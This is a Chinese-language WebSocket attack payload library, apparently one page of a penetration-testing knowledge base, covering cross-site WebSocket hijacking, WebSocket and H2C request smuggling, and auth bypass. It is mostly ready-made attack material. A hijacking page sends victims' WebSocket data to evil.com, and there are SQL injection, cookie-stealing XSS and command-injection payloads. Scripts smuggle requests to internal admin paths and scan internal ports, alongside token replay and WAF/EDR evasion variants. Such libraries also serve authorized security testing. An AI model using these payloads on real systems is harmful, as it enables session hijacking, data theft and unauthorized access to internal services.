# WebSocket 安全 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:WebSocket 跨站劫持(CSWSH) / WS 走私 / WS 认证授权绕过。任何 `wss://` / `ws://` 端点都试。

---

### WebSocket跨站劫持(CSWSH)  `ws-hijack`
利用WebSocket握手阶段缺少Origin验证的漏洞，通过恶意网页建立跨站WebSocket连接。攻击者可劫持受害者的WebSocket会话，窃取实时数据或以受害者身份发送消息。类似于CSRF但针对WebSocket协议。
子类：**WebSocket劫持** · tags: `WebSocket` `CSWSH` `Origin` `跨站` `会话劫持`

**前置条件：** 目标使用WebSocket通信；WebSocket握手未验证Origin

**攻击链：**

**1. 1. 识别WebSocket端点**
_搜索WebSocket端点并测试是否接受任意Origin的跨站连接_
```
# 从前端代码搜索WebSocket连接
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"

# 浏览器开发者工具检查(Console)
# 在Network标签筛选WS类型请求

# 手动连接测试
websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close

# 检查握手响应中的Origin处理
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Origin: https://evil.com" \
  "https://{TARGET}/ws"
```

**2. 2. 构造跨站劫持POC页面**
_创建恶意HTML页面利用受害者Cookie建立WebSocket连接并窃取数据_
```
<!-- CSWSH攻击页面 -->
<html>
<body>
<h1>WebSocket Cross-Site Hijacking POC</h1>
<div id="output"></div>
<script>
  // 目标WebSocket——浏览器会自动带上Cookie
  var ws = new WebSocket("wss://{TARGET}/ws");
  
  ws.onopen = function() {
    document.getElementById("output").innerHTML += "<p>Connected!</p>";
    // 以受害者身份发送消息
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
  };
  
  ws.onmessage = function(evt) {
    // 窃取WebSocket返回的数据
    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
    // 外带到攻击者服务器
    fetch("https://evil.com/collect", {
      method: "POST",
      body: evt.data
    });
  };
</script>
</body>
</html>
```

**3. 3. WebSocket消息注入**
_通过WebSocket消息注入SQL/XSS/命令注入payload_
```
# 如果WebSocket消息被拼入后端查询
# SQL注入
ws.send(JSON.stringify({
  action: "search",
  query: "test\x27 UNION SELECT username,password FROM users--"
}));

# XSS(如果消息被渲染到其他用户页面)
ws.send(JSON.stringify({
  action: "chat",
  message: "<img src=x onerror=alert(document.cookie)>"
}));

# 命令注入
ws.send(JSON.stringify({
  action: "exec",
  target: "127.0.0.1;id"
}));
```

**4. 4. WebSocket流量分析脚本**
_Python脚本实时监控WebSocket流量并记录敏感数据_
```
# Python WebSocket监听和分析脚本
import asyncio
import websockets
import json

async def monitor():
    uri = "wss://{TARGET}/ws"
    headers = {"Cookie": "{SESSION_COOKIE}"}
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # 发送认证消息
        await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
        
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"[{data.get('type', 'unknown')}] {msg}")
            
            # 记录敏感数据
            if 'password' in msg.lower() or 'token' in msg.lower():
                with open('ws_sensitive.log', 'a') as f:
                    f.write(msg + '\n')

asyncio.run(monitor())
```

**WAF/EDR 绕过变体：**

**1. 绕过Origin验证**
_通过Origin伪造、子域名、null Origin和子协议绕过WebSocket Origin验证_
```
# Origin头伪造(仅在非浏览器环境有效)
websocat "wss://{TARGET}/ws" -H "Origin: https://{TARGET}"

# 子域名绕过
Origin: https://test.{TARGET}  # 如果验证不严格
Origin: https://{TARGET}.evil.com  # 域名后缀混淆

# null Origin(某些浏览器场景)
# 使用data: URI或沙箱iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>">

# 使用WebSocket子协议绕过
Sec-WebSocket-Protocol: graphql-ws, chat
```

---

### WebSocket走私攻击  `ws-smuggling`
利用反向代理/负载均衡器对WebSocket协议处理的差异，通过WebSocket升级请求走私HTTP请求到内网服务。攻击者可绕过前端安全控制直接与后端通信，访问受保护的内部API或管理接口。
子类：**WebSocket走私** · tags: `WebSocket` `走私` `反向代理` `H2C` `内网穿透`

**前置条件：** 目标使用反向代理(Nginx/Varnish等)；代理允许WebSocket升级；后端存在内部服务

**攻击链：**

**1. 1. 检测WebSocket走私可能性**
_通过Upgrade请求测试反向代理是否存在WebSocket/H2C走私漏洞_
```
# 测试Upgrade响应
curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  "https://{TARGET}/"

# 测试H2C走私(HTTP/2 Cleartext)
curl -i -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "https://{TARGET}/"

# 检测代理类型
curl -I "https://{TARGET}/" | grep -iE "server:|via:|x-powered-by:"
```

**2. 2. WebSocket隧道构造**
_WebSocket升级后通过原始Socket发送走私的HTTP请求访问内部接口_
```
# 使用Python构造WebSocket走私
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket握手
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # 走私HTTP请求到内网
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")
```

**3. 3. H2C走私绕过访问控制**
_使用h2cSmuggler工具通过HTTP/2升级走私访问内网服务和管理接口_
```
# h2cSmuggler工具
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://{TARGET}/admin/"

# 手动H2C走私——访问内部API
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://127.0.0.1:8080/api/internal/users"

# 扫描内网端口
for port in 80 8080 8443 9090 3000 5000; do
  python3 h2cSmuggler.py -x "https://{TARGET}" \
    "http://127.0.0.1:$port/" 2>/dev/null && echo "Port $port: OPEN"
done
```

**4. 4. 反向代理差异利用**
_利用不同反向代理(Nginx/Varnish/HAProxy)的WebSocket处理差异进行走私_
```
# Nginx WebSocket走私
# 如果Nginx配置proxy_pass到后端
# 但未限制Upgrade请求

# 测试反向代理路径差异
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/..;/admin/"

# Varnish缓存投毒+WebSocket
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "X-Forwarded-Host: evil.com" \
  "https://{TARGET}/"

# HAProxy WebSocket走私
# 利用HAProxy在Upgrade后不再检查后续请求
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/" --next -H "Host: internal" "https://{TARGET}/admin/"
```

**WAF/EDR 绕过变体：**

**1. 绕过WAF的WebSocket检测**
_通过大小写混淆、分块传输和压缩Extension绕过WAF对WebSocket走私的检测_
```
# 大小写混淆
Connection: upgrade
Upgrade: WebSocket  # 大小写变体
Upgrade: WEBSOCKET

# 分块传输隐藏走私内容
Transfer-Encoding: chunked
# 在WebSocket帧中嵌入HTTP请求

# 使用WebSocket Extension混淆
Sec-WebSocket-Extensions: permessage-deflate
# 压缩后的恶意消息难以被WAF检测

# 伪装为正常WebSocket流量
# 先发送正常消息，延迟后发送走私请求
```

---

### WebSocket认证与授权绕过  `ws-auth-bypass`
利用WebSocket连接建立后缺少持续认证检查的漏洞，通过会话固定、令牌重放、频道越权订阅等方式绕过认证和授权机制。WebSocket的长连接特性使得权限变更后原连接仍可保持访问。
子类：**认证绕过** · tags: `WebSocket` `认证` `授权` `越权` `Token重放`

**前置条件：** 目标使用WebSocket实时通信；已获取有效会话/Token

**攻击链：**

**1. 1. WebSocket认证机制分析**
_通过Monkey-patch WebSocket对象拦截和分析认证流程_
```
# 抓取WebSocket握手和初始消息
# 在浏览器Console中:
const origWS = WebSocket;
window.WebSocket = function(url, protocols) {
  console.log("[WS] Connecting to:", url);
  const ws = new origWS(url, protocols);
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("[WS] SEND:", data);
    origSend(data);
  };
  ws.addEventListener("message", e => console.log("[WS] RECV:", e.data));
  return ws;
};

# 观察认证流程：
# 1. Cookie/Token在握手阶段传递？
# 2. 连接后发送auth消息？
# 3. 是否有心跳保活机制？
```

**2. 2. Token重放与会话固定**
_测试Token过期后的重放和WebSocket连接在注销后是否仍活跃_
```
# 测试Token过期后是否仍可使用
# Step 1: 记录有效Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: 等待Token过期/注销账号
# Step 3: 尝试用旧Token建立WebSocket连接
websocat "wss://{TARGET}/ws" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -5

# 测试WebSocket连接在用户注销后是否仍然活跃
# (WebSocket长连接可能不受HTTP会话注销影响)

# 会话固定——使用他人Token
websocat "wss://{TARGET}/ws" \
  -H "Cookie: session={OTHER_USER_SESSION}"
```

**3. 3. 频道/房间越权订阅**
_测试WebSocket频道/房间的授权控制，尝试越权订阅他人私有频道_
```
# 订阅其他用户的私有频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "user.1002.notifications"  // 尝试订阅其他用户
}));

# 订阅管理员频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "admin.dashboard"
}));

# 遍历频道ID
for (let i = 1; i <= 100; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user.${i}.messages`
  }));
}

# 测试频道名注入
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "public.*"  // 通配符订阅
}));
```

**4. 4. WebSocket速率限制与DoS测试**
_测试WebSocket的消息速率限制和大小限制_
```
# 测试消息速率限制
import asyncio, websockets, json, time

async def rate_test():
    uri = "wss://{TARGET}/ws"
    async with websockets.connect(uri) as ws:
        # 快速发送消息测试速率限制
        start = time.time()
        for i in range(1000):
            await ws.send(json.dumps({"action": "ping", "seq": i}))
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        
        # 大消息测试
        large_msg = "A" * (1024 * 1024)  # 1MB
        try:
            await ws.send(large_msg)
            print("Large message accepted - no size limit!")
        except Exception as e:
            print(f"Large message rejected: {e}")

asyncio.run(rate_test())
```

**WAF/EDR 绕过变体：**

**1. 绕过WebSocket认证机制**
_利用协议降级、重连机制和轮询降级绕过WebSocket认证_
```
# 使用低权限Token获取高权限WebSocket连接
# 某些实现仅在握手时验证Token，连接后不再检查

# 利用WebSocket重连机制
# 某些客户端实现会在断线后自动重连
# 拦截重连请求替换Token

# 协议降级攻击
# 从wss://降级到ws://(如果后端支持)
websocat "ws://{TARGET}/ws" -H "Cookie: session={TOKEN}"

# 利用Socket.io/SockJS的HTTP降级
curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
```

---

---

← 回 [00-index.md](00-index.md)
